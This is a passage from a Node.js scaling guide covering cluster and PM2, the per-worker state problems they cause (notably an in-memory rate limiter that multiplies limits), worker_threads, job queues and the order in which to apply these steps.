> **Cheapest real win available to you:** swap `bcryptjs` for `bcrypt`. Same API, same `await`s, and the hashing leaves your event loop. It is a native build, which is the only reason `bcryptjs` exists.

---

### 19.6 Cluster — what it actually is

**One process runs on one core.** Your machine has more. `cluster` starts N copies of your app — a **primary** that forks **workers**, all sharing one listening port, with the OS handing each new connection to one of them.

```text
                        :3005
                          │
                 ┌────────┴────────┐
                 │  primary (fork  │   no requests, just supervises
                 │  + respawn)     │
                 └────────┬────────┘
        ┌────────────┬────┴───────┬────────────┐
   worker 1     worker 2     worker 3     worker 4
   own event    own event    own event    own event
   loop, own    loop, own    loop, own    loop, own
   memory       memory       memory       memory
```

**Separate processes, not threads** — no shared variables, no shared memory. Four cores ≈ four times the throughput, and one worker crashing or blocking no longer takes the whole site down.

```js
// cluster.js — you would run this instead of app.js
const cluster = require('node:cluster');
const os = require('node:os');

if (cluster.isPrimary) {
    for (let i = 0; i < os.availableParallelism(); i++) cluster.fork();

    cluster.on('exit', (worker) => {
        console.error(`worker ${worker.process.pid} died — restarting`);
        cluster.fork();
    });
} else {
    require('./app');   // each worker runs your app unchanged
}
```

**In practice you don't write that file.** PM2 or your host does it:

```bash
pm2 start app.js -i max     # one worker per core, restarts, log handling
```

What clustering does and does not fix:

| | |
|---|---|
| ✅ uses all your cores | 4 cores instead of 1 |
| ✅ survives a crash | the primary respawns the worker |
| ✅ survives one blocked worker | the other three keep serving |
| ❌ makes a single request faster | one request still runs on one core |
| ❌ removes the blocking rule | now you have four blockable lanes instead of one |
| ❌ helps a database bottleneck | four workers hammer the same Mongo harder |

---

### 19.7 Do you need code changes? Almost none — except these

The clustering itself needs no changes to your controllers. What breaks is **anything you kept in a variable**, because each worker has its own copy of everything.

| Thing | What happens with 4 workers | Fix |
|-------|-----------------------------|-----|
| ⚠️ **rate limiter** (`middleware/rateLimit.js`) | counters are in memory, per process, so a client gets **4 × 10 = 40** requests instead of 10 — silently | a shared store: `rate-limit-redis` |
| ⚠️ **`User.syncIndexes()`** in `app.js` | runs **4 times** on every boot, once per worker | harmless, but guard it with `cluster.isPrimary` to keep startup clean |
| in-memory cache (when you add one) | 4 separate caches, 4× the misses, inconsistent reads | Redis |
| `logs/access.log` | 4 processes appending; lines survive but interleave | add the pid to the format, or log to stdout and let the platform collect |
| console output | interleaved from 4 workers | same — include `process.pid` |
| WebSockets / in-memory sessions | a client's second connection may land on a different worker | sticky sessions, or move state out |
| graceful shutdown | each worker must close its own server and Mongo connection | handle `SIGTERM` inside the worker |

✅ **What is already safe:** JWT auth is **stateless** — any worker can verify any token, because nothing about the session lives in memory. Mongo connections are per-worker, which is fine. This is the payoff of the design in [§8d](#8d-jwt-lifecycle--sign-verify-requser).

> The pattern to remember: **clustering turns every piece of local state into a bug.** That is the real cost, not the fork call.

---

### 19.8 Worker threads — the other tool, for a different problem

`worker_threads` gives you extra threads **inside one process**, for CPU work that would otherwise block. Not for handling more users — for getting one expensive job off the event loop.

```js
// main side
const { Worker } = require('node:worker_threads');

const runJob = (data) => new Promise((resolve, reject) => {
    const worker = new Worker('./heavy-job.js', { workerData: data });
    worker.on('message', resolve);
    worker.on('error', reject);
});

// heavy-job.js
const { parentPort, workerData } = require('node:worker_threads');
parentPort.postMessage(crunch(workerData));   // event loop stays free
```

**This one does need code changes** — the expensive function moves into its own file and you talk to it by passing messages, so anything sharing closures or module state has to be restructured.

Choosing between the three:

| Tool | Use it for | Your app |
|------|-----------|----------|
| **async / await** (default) | anything that waits: db, HTTP, files | everything you have |
| **cluster / PM2** | using all cores, crash isolation | the next real step, when traffic justifies it |
| **worker_threads** | image resize, PDF/report generation, big crunching | nothing today |

For genuinely long jobs (a minute of work, a nightly report), neither one is the answer — that is a **job queue** (BullMQ + Redis): the request returns `202 Accepted` immediately and a separate worker process does the work.

---

### 19.9 The order to do things in

1. **Measure before scaling.** Event-loop lag and p95 latency ([§15](#15-api-performance--observability--the-vocabulary-and-the-loop)). Slow *and* idle CPU means the database or a missing index — more processes will not help.
2. **Fix blocking first.** Swap `bcryptjs` → `bcrypt`, keep sync calls out of request paths.
3. **Add indexes.** Almost always the biggest win in an app like this.
4. **Then cluster** — via PM2 or your host, and move the rate limiter to Redis in the same change, or your limits quietly multiply.
5. **Then more machines** behind a load balancer, which is when `/health` ([§12](#12-request-logging-morgan--health-check)) starts earning its keep and `app.set('trust proxy', 1)` ([§18](#18-what-is-an-api-gateway)) becomes mandatory.
6. **worker_threads or a queue** only when you actually have CPU-heavy or long-running work.

---

### One-line summary

**One Node thread already serves hundreds of users because your JavaScript runs for well under a millisecond per request and spends the rest waiting on Mongo — waiting is done by the OS, not by you. The single rule is that synchronous CPU work freezes everyone, which is why `bcryptjs` (pure JS, on your thread) is worth swapping for native `bcrypt`. `cluster`/PM2 then runs one process per core for throughput and crash isolation, needing no controller changes but immediately breaking in-memory state — your per-process rate limiter would give every client 4× its limit. `worker_threads` is unrelated: extra threads for CPU-bound jobs you don't have yet.**

See also: [§11 rate limiting](#11-rate-limiting--what-it-is-strategies-what-we-use), [§12 morgan + health check](#12-request-logging-morgan--health-check), [§15 performance & observability](#15-api-performance--observability--the-vocabulary-and-the-loop), [§16.5 backpressure](#165-surviving-traffic-spikes-with-backpressure), [§16.6 scaling with threads and processes](#166-scaling-nodejs-with-threads-processes-and-clustering).

